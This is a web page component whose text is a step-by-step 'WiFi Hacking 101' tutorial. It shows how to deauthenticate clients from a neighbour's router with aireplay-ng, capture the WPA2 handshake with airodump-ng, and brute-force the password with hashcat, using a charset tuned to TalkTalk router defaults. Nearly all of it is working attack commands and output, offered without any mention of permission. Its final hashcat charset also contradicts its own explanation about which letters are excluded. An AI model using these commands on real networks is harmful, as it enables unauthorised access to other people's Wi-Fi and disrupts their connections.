export default function Home() {
  return (
    <div className='bg-[rgb(17,17,19)] grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20 font-[family-name:var(--font-geist-sans)]'>
      <main className='flex flex-col row-start-2 gap-8 items-center sm:items-start'>
        <div className='flex flex-col gap-8 row-start-2 items-center sm:items-start max-w-screen-sm'>
          <h1 className='text-3xl font-bold bg-gradient-to-bl from-[rgb(125,184,255)] to-[rgb(202,230,252)] bg-clip-text text-transparent'>
            WiFi Hacking 101
          </h1>
          <h2 className='text-2xl font-bold'>Goal</h2>
          <p>
            Capture a handshake between a device and a router. The EAPOL 4-way
            handshake is essentially an encrypted version of the WiFi password.
            We can acquire these without being on the network with minimal
            hardware and little to no cost. In this example I&apos;m using a ~$5
            Ralink USB WiFi dongle from about 8 years ago, only because I&apos;m
            using a Mac though, Most PC&apos;s should support injection with the
            built in card, so no need for an extra dongle.
          </p>
          <p className='font-bold italic'>RUN COMMANDS AS ROOT OR USE SUDO</p>
          <h2 className='text-2xl font-bold'>Gather Info</h2>
          <p>Run iwconfig to get the WiFi adapter name</p>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg whitespace-pre-wrap'>
            <code>iwconfig</code>
          </pre>
          <p>It should print something like this:</p>
          <pre className='px-3 py-1 bg-customColor1 border-[1px] border-[rgb(224, 240, 255)] rounded-lg w-full max-w-screen-sm whitespace-pre-wrap overflow-auto'>
            <code className='text-sm text-nowrap'>{`lo        no wireless extensions.

enp0s1    no wireless extensions.

wlx00198671d2c9  IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off`}</code>
          </pre>
          <p>
            <span className='font-bold'>lo</span> is the loopback interface (the
            computer you&apos;re running from)
          </p>
          <p>
            <span className='font-bold'>enp0s1</span> is the ethernet interface,
            en in the name for &apos;ethernet&apos;
          </p>
          <p>
            <span className='font-bold'>wlx00198671d2c9</span> is our wifi card,
            &apos;wl&apos; in the name for &apos;wireless&apos;. Make a note of
            this.
          </p>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg'>
            <code>airodump-ng wlx00198671d2c9</code>
          </pre>
          <p>
            This displays a table of available networks around you to connect to
            and any devices connected to them and which router they are
            connected to like this
          </p>
          <pre className='px-3 py-1 bg-customColor1 border-[1px] border-[rgb(224, 240, 255)] rounded-lg w-full max-w-screen-sm whitespace-pre-wrap overflow-auto'>
            <code className='text-sm text-nowrap'>
              {` CH  6 ][ Elapsed: 36 s ][ 2025-01-23 06:10

 BSSID              PWR  Beacons    #Data, #/s  CH   MB    ENC CIPHER  AUTH ESSID

 A2:7E:79:7F:1D:A2  -83        5        0    0   6  130   WPA2 CCMP   PSK  iPhone (6)
 72:B6:87:13:4E:AB  -83        2        0    0  11  195   OPN              EE WiFi
 00:1E:80:FE:15:B4  -81        5        0    0   1  130   WPA2 CCMP   PSK  Grain-1217135
 D0:6D:C9:EF:33:AA  -79       14        4    0   1  195   WPA2 CCMP   PSK  TALKTALKEF33AD
 98:42:65:D2:8E:47  -73       13        5    0   6  195   WPA2 CCMP   PSK  TALKTALKD28E4A
 C0:D7:AA:B1:E2:CD  -81       11        2    0  11  195   WPA2 CCMP   PSK  BT-MJCTN3
 6A:D7:AA:B1:E2:C9  -81       13        0    0  11  195   WPA2 CCMP   PSK  <length:  9>
 AC:B6:87:13:4E:AA  -82        1        2    0  11  195   WPA2 CCMP   PSK  BTB-JSCGJH
 F8:0D:A9:18:43:FF  -70       13        0    0   3  260   WPA3 CCMP   SAE  GRAIN_43FF
 44:D4:53:01:CB:0D  -79       15        0    0   1  195   WPA2 CCMP   PSK  TALKTALK01CB10

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes


 AC:B6:87:13:4E:AA  F0:C8:14:90:60:C0  -80    0 - 1e     0       18
 C0:D7:AA:B1:E2:CD  12:A5:0A:CA:7B:35  -84    0 - 2e     0        2
 (not associated)   54:C9:DF:77:40:6F  -76    0 - 1      0        2
 F8:0D:A9:18:43:FF  32:99:8C:3B:8D:1B  -72    0 -24      0        1`}
            </code>
          </pre>

          <p>
            We&apos;re interested in the MAC Address (BSSID) of the router and
            the channel it&apos;s running on.
          </p>
          <p>
            In the above example it&apos;s 98:42:65:D2:8E:47 and channel 6.
            We&apos;ll use these in the next steps.
          </p>
          <h2 className='text-2xl font-bold'>
            Put Your WiFi Card In Monitor Mode
          </h2>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg max-w-screen-sm whitespace-pre-wrap'>
            <code>airmon-ng</code>
          </pre>
          <pre className='px-3 py-1 bg-customColor1 border-[1px] border-[rgb(224, 240, 255)] rounded-lg w-full max-w-screen-sm whitespace-pre-wrap overflow-auto'>
            <code className='text-sm text-nowrap'>
              {`PHY     Interface        Driver     Chipset

phy0    wlx00198671d2c9  rt2800usb  Ralink Technology, Corp. RT5370`}
            </code>
          </pre>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg max-w-screen-sm whitespace-pre-wrap'>
            <code>
              {`airmon-ng check kill 
airmon-ng start wlx00198671d2c9`}
            </code>
          </pre>
          <pre className='px-3 py-1 bg-customColor1 border-[1px] border-[rgb(224, 240, 255)] rounded-lg w-full max-w-screen-sm whitespace-pre-wrap overflow-auto'>
            <code className='text-sm text-nowrap'>
              {`PHY     Interface        Driver     Chipset

phy1    wlx00198671d2c9  rt2800usb  Ralink Technology, Corp. RT5370
Interface wlx00198671d2c9mon is too long for linux so it will be renamed to the old style (wlan#) name.

        (mac80211 monitor mode vif enabled on [phy1]wlan0mon
        (mac80211 station mode vif disabled for [phy1]wlx00198671d2c9)`}
            </code>
          </pre>
          <p>
            My card had a long name so airmon changed it to a simpler default
            when I put it into monitor mode to{' '}
            <span className='font-bold'>wlan0mon</span>.
          </p>
          <p>
            Check airmon-ng again, it should now display your card in monitor
            mode, Note how &apos;wlx00198671d2c9&apos; is now
            &apos;wlan0mon&apos;
          </p>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg max-w-screen-sm whitespace-pre-wrap'>
            <code>airmon-ng</code>
          </pre>
          <pre className='px-3 py-1 bg-customColor1 border-[1px] border-[rgb(224, 240, 255)] rounded-lg w-full max-w-screen-sm whitespace-pre-wrap overflow-auto'>
            <code className='text-sm text-nowrap'>
              {`PHY     Interface   Driver      Chipset

phy1    wlan0mon    rt2800usb   Ralink Technology, Corp. RT5370`}
            </code>
          </pre>
          <h2 className='text-2xl font-bold'>The Attack</h2>
          <p>
            Open 2 terminal tabs/windows and run airodump-ng again. This time
            point it at the MAC address (bssid) and channel of the router you
            want to attack. we pass{' '}
            <code className='px-2 py-1 bg-customColor1 rounded-lg'>-w</code> as
            an argument to write/save to a file
          </p>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg max-w-screen-sm whitespace-pre-wrap'>
            <code>
              airodump-ng --bssid 98:42:65:D2:8E:47 -c6 wlan0mon -w handshake
            </code>
          </pre>
          <p>
            In another window, start kicking devices off the router by spamming
            it with deauth packets.
          </p>
          <p>
            Aireplay-ng is the replay attack suite. we use it to replay packets
            and inject deauth frames to a specific router, running on a certain
            channel using attack mode ‘0’ (Deauth Attack). The number ‘0’ after
            it is the amount of Deauth frames to send. If set to 0, it sends
            indefinitely (AKA kick people off WiFi). Finally you give a WiFi
            adapter to inject the frames from, in this case it’s my cheap old
            Ralink WiFi adapter. This cost less than $5 over 6-7 years ago and
            it’s only 2.4GHz so it’s impressive to see it still capable of
            performing the attacks described in 2025.
          </p>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg max-w-screen-sm whitespace-pre-wrap'>
            <code>aireplay-ng -a 98:42:65:D2:8E:47 -0 0 wlan0mon</code>
          </pre>
          <p>
            It&apos;s better to attack a specific device if you can. You can
            specify one with -c like this
          </p>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg max-w-screen-sm whitespace-pre-wrap'>
            <code>
              aireplay-ng -a 98:42:65:D2:8E:47 -c 6E:EB:E6:7B:9B:BB -0 0
              wlan0mon
            </code>
          </pre>
          <pre className='px-3 py-1 bg-customColor1 border-[1px] border-[rgb(224, 240, 255)] rounded-lg w-full max-w-screen-sm whitespace-pre-wrap overflow-auto'>
            <code className='text-sm text-nowrap'>
              {`root@debian:/home/a# aireplay-ng -a 98:42:65:D2:8E:47 -0 0 wlan0mon
08:34:27  Waiting for beacon frame (BSSID: 98:42:65:D2:8E:47) on channel 6
NB: this attack is more effective when targeting
a connected wireless client (-c <clients mac>).
08:34:27  Sending DeAuth (code 7) to broadcast -- BSSID: [98:42:65:D2:8E:47]
08:34:27  Sending DeAuth (code 7) to broadcast -- BSSID: [98:42:65:D2:8E:47]
08:34:28  Sending DeAuth (code 7) to broadcast -- BSSID: [98:42:65:D2:8E:47]
08:34:28  Sending DeAuth (code 7) to broadcast -- BSSID: [98:42:65:D2:8E:47]
08:34:29  Sending DeAuth (code 7) to broadcast -- BSSID: [98:42:65:D2:8E:47]

root@debian:/home/a# aireplay-ng -a 98:42:65:D2:8E:47 -c 6E:EB:E6:7B:9B:BB -0 0 wlan0mon
08:33:49  Waiting for beacon frame (BSSID: 98:42:65:D2:8E:47) on channel 6
08:33:49  Sending 64 directed DeAuth (code 7). STMAC: [6E:EB:E6:7B:9B:BB] [ 0|51 ACKs]
08:33:50  Sending 64 directed DeAuth (code 7). STMAC: [6E:EB:E6:7B:9B:BB] [ 0|64 ACKs]
08:33:51  Sending 64 directed DeAuth (code 7). STMAC: [6E:EB:E6:7B:9B:BB] [ 0|63 ACKs]
08:33:51  Sending 64 directed DeAuth (code 7). STMAC: [6E:EB:E6:7B:9B:BB] [ 0|61 ACKs]
08:33:52  Sending 64 directed DeAuth (code 7). STMAC: [6E:EB:E6:7B:9B:BB] [ 0|61 ACKs]`}
            </code>
          </pre>
          <p>
            Leave that running and back in the first window you&apos;ll see the
            same interface as before but this time we are watching the top right
            of the window
          </p>
          <pre className='px-3 py-1 bg-customColor1 border-[1px] border-[rgb(224, 240, 255)] rounded-lg w-full max-w-screen-sm whitespace-pre-wrap overflow-auto'>
            <code className='text-sm text-nowrap'>
              {` CH  6 ][ Elapsed: 5 mins ][ 2025-01-23 07:50 ][ WPA handshake: 98:42:65:D2:8E:47

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB    ENC  CIPHER  AUTH  ESSID


 98:42:65:D2:8E:47  -58 100     3302      619    0   6  195   WPA2  CCMP    PSK   TALKTALKD28E4A

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   82:2F:2E:B6:06:FE  -48    0 - 1      0        1         TALKTALKD28E4A
 98:42:65:D2:8E:47  1A:0D:68:A3:17:EC  -40    1e- 1      0       38         TALKTALKD28E4A
 98:42:65:D2:8E:47  6E:EB:E6:7B:9B:BB  -58    1e- 1e     0       13  EAPOL  TALKTALKD28E4A`}
            </code>
          </pre>
          <p>
            At the top right it now says:{' '}
            <span className='font-bold'>WPA handshake: 98:42:65:D2:8E:47</span>.
            Under notes it also says EAPOL which means it captured the EAPOL
            handshake from that device.
          </p>
          <p>
            The{' '}
            <span className='px-2 py-1 bg-customColor1 rounded-lg'>
              -w handshake
            </span>{' '}
            on the above command makes sure it writes the handshake capture to a
            file named handshake. The handshake is basically the encrypted WiFi
            password. We need to convert this and decrypt it to get the actual
            password. We can use `hashcat` for that so make sure to install it.
            If we list files in the current directory with `ls -la` we should
            see a few files
          </p>
          <ul>
            <li>handshake-01.cap</li>
            <li>handshake-01.csv</li>
            <li>handshake-01.kismet.csv</li>
            <li>handshake-01.kismet.netxml</li>
            <li>handshake-01.log.csv</li>
          </ul>
          <h2 className='text-2xl font-bold'>Getting The Password</h2>
          <p>
            We are only really interested in the &apos;.cap&apos; file.
            We&apos;ll use a hashcat utility &apos;hcxpcapngtool&apos; to
            convert the file into something hashcat can brute force so we can
            recover the password. We give{' '}
            <span className='px-2 py-1 bg-customColor1 rounded-lg'>-o</span> for
            output file then specify the input (.cap) file we captured earlier
          </p>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg max-w-screen-sm whitespace-pre-wrap'>
            <code>hcxpcapngtool -o handshake01.22000 handshake-01.cap</code>
          </pre>
          <p>
            This will give us a &apos;.22000&apos; file that the newer hashcat
            prefers for this.
          </p>
          <pre className='px-3 py-1 max-w-screen-sm whitespace-pre-wrap'>
            <code>[TIP 👀]</code>
          </pre>
          <pre className='px-3 py-1 bg-black max-w-screen-sm whitespace-pre-wrap border-2 border-solid rounded-lg overflow-auto'>
            <code className='text-sm'>
              The best thing to do is, Use Wireshark to slim down the .cap file
              first. You need 5 packets. The 4 way handshake and the
              broadcast/beacon packet from the router. Use these filters eapol
              Filters packets related to the 4-way handshake (EAPOL protocol).
              wlan.fc.type_subtype == 0x08: Filters beacon frames (broadcast
              packets) from the router.
            </code>
          </pre>
          <p>
            Since I am attacking a &apos;TALKTALK&apos; router, We know from
            publicly available info that it uses
          </p>
          <span className='font-bold italic'>Numbers: 346789</span>
          <span className='font-bold italic'>
            Characters: ABCDEFGHJKMNPQRTUVWXY
          </span>
          <p>
            Basically it uses capital A-Z and numerical 0-9{' '}
            <span className='font-bold italic'>But</span> it does miss a few
            numbers (0,1,2,5) and letters (I,L,O,S,Z) out and we can save a{' '}
            <span className='font-bold italic'>lot</span> of time by not
            searching for those. It goes from 146 days down to just 14 days for
            me by removing just 4 numbers and 5 characters. See Hashcat output
            below for each command
          </p>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg max-w-screen-sm whitespace-pre-wrap'>
            <code>
              hashcat -m 22000 -a 3 handshake01.22000 -1
              0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ ?1?1?1?1?1?1?1?1 -w 3
              --status
            </code>
          </pre>
          <pre className='px-3 py-1 bg-customColor1 border-[1px] border-[rgb(224, 240, 255)] rounded-lg w-full max-w-screen-sm whitespace-pre-wrap overflow-auto'>
            <code className='text-sm text-nowrap'>
              {`Session..........: hashcat
Status...........: Running
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: handshake01.22000
Time.Started.....: Thu Jan 23 16:54:33 2025 (8 secs)
Time.Estimated...: Thu Jun 19 01:15:53 2025 (146 days, 7 hours)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?1?1?1?1?1?1?1?1 [8]
Guess.Charset....: -1 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ, -2 Undefined, -3 Undefined, -4 Undefined
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   223.2 kH/s (69.89ms) @ Accel:16 Loops:1024 Thr:128 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 1769472/2821109907456 (0.00%)
Rejected.........: 0/1769472 (0.00%)
Restore.Point....: 0/78364164096 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:27-28 Iteration:2048-3072
Candidate.Engine.: Device Generator
Candidates.#1....: E2345678 -> ER3BERIN
Hardware.Mon.SMC.: Fan0: 28%, Fan1: 28%
Hardware.Mon.#1..: Util: 99%`}
            </code>
          </pre>
          <pre className='px-3 py-1 bg-customColor1 border-[1px] border-[rgb(224, 240, 255)] rounded-lg w-full max-w-screen-sm whitespace-pre-wrap'>
            <code>
              hashcat -m 22000 -a 3 handshake01.22000 -1
              346789ABCDEFGHJKMNPQRTUVWXY ?1?1?1?1?1?1?1?1 -w 3 --status
            </code>
          </pre>
          <pre className='px-3 py-1 bg-customColor1 border-[1px] border-[rgb(224, 240, 255)] rounded-lg w-full max-w-screen-sm whitespace-pre-wrap overflow-auto'>
            <code className='text-sm text-nowrap'>
              {`Session..........: hashcat
Status...........: Running
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: handshake01.22000
Time.Started.....: Thu Jan 23 16:55:39 2025 (2 secs)
Time.Estimated...: Fri Feb  7 13:41:22 2025 (14 days, 20 hours)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?1?1?1?1?1?1?1?1 [8]
Guess.Charset....: -1 346789ABCDEFGHJKMNPQRTUVWXY, -2 Undefined, -3 Undefined, -4 Undefined
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   219.9 kH/s (69.51ms) @ Accel:16 Loops:1024 Thr:128 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 524288/282429536481 (0.00%)
Rejected.........: 0/524288 (0.00%)
Restore.Point....: 0/10460353203 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:8-9 Iteration:1024-2048
Candidate.Engine.: Device Generator
Candidates.#1....: A8778888 -> AA8BURAN
Hardware.Mon.SMC.: Fan0: 28%, Fan1: 28%
Hardware.Mon.#1..: Util: 99%`}
            </code>
          </pre>
          <p>
            To do this we make a custom character set/dictionary for hashcat to
            use. create a text file and put this inside. I call it
            custom-charset.txt but use whatever works for you.
          </p>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg max-w-screen-sm whitespace-pre-wrap'>
            <code>346789ABCDEFGHJKMNPQRTUVWXY</code>
          </pre>
          <p>
            Now we decrypt the stolen handshake capture to get the WiFi
            password.
          </p>
          <pre className='px-3 py-1 bg-customColor1 rounded-lg max-w-screen-sm whitespace-pre-wrap'>
            <code>
              hashcat -m 22000 -a 3 handshake01.22000 -1
              346789ABCDEFGHJKLMNPQRTUVWXYZ ?1?1?1?1?1?1?1?1 -w 3
              --session=my_session --status
            </code>
          </pre>
          <h3 className='text-xl font-bold'>Explanation</h3>
          <p>
            <span className='font-bold'>-m 22000:</span> Specify the hash mode
            for WPA-PBKDF2-PMKID+EAPOL.
          </p>
          <p>
            <span className='font-bold'>-a 3:</span> Use brute-force attack
            mode.
          </p>
          <p>
            <span className='font-bold'>handshake01.22000:</span> The path to
            your .22000 file.
          </p>
          <p>
            <span className='font-bold'>-1 346789ABCDEFGHJKLMNPQRTUVWXYZ:</span>{' '}
            Define a custom character set directly in the command. The character
            set excludes problematic characters (I, O, L, S, Z) and unused
            numbers.
          </p>
          <p>
            <span className='font-bold'>?1?1?1?1?1?1?1?1:</span> The mask for an
            8-character password.
          </p>
          <p>
            <span className='font-bold'>-w 3</span> Set workload profile to high
            performance.
          </p>
          <p>
            <span className='font-bold'>--session=my_session:</span> Save the
            session to allow pausing and resuming.
          </p>
          <p>
            <span className='font-bold'>--status</span> Display real-time status
            updates.
          </p>
          <p>
            Run{' '}
            <span className='px-3 py-1 bg-customColor1 rounded-lg'>
              hashcat --help
            </span>{' '}
            to get an exhaustive list of options and modes.
          </p>
        </div>
      </main>
      <footer></footer>
    </div>
  )
}
